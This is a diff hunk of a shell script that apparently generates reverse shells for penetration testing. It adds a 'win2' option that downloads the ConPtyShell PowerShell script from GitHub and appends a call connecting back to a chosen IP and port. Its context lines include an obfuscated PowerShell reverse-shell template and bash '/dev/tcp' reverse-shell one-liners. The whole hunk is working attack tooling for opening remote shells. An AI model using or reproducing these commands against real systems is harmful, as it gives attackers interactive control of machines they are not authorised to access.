@@ -58,6 +58,10 @@ case "$1" in
         cp /opt/PrviEsc/WinPrviEsc/RevShell/Invoke-PowerShellTcp-obfuscate.ps1 rev.ps1;
         sed -i "s/ChangeThisIP/$ip/;s/ChangeThisPort/$port/g" rev.ps1;
         listener win;;
+    "win2") #Fully Interactive Reverse Shell
+        wget -q https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -O rev.ps1;
+        echo -e "\nInvoke-ConPtyShell -RemoteIp $ip -RemotePort $port -Rows 45 -Cols 173" >> rev.ps1;
+        listener win;;
     *)   #Bash
 	echo -e "bash -i >& /dev/tcp/$ip/$port 0>&1";
 	echo -e "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";
